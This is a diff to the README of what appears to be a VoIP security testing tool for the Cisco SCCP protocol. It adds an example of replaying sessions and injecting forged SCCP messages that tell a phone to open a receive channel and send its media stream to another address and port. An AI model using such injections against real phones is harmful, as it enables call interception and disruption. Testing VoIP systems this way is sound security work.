@@ -32,3 +32,8 @@
 ## Replay with injection
 
     sccpreplay -f 'session in (208,209,210)' -i
+    
+## Inejcting messages
+
+    injectMsg('192.168.0.10', sccpopenreceivechannel.SCCPOpenReceiveChannel(payloadCapability=4, msPacket=20))
+    injectMsg('192.168.0.10', startmediatransmission.StartMediaTransmission(remoteIpAddress='192.168.0.1', remotePort=4446, payloadCapability=4))
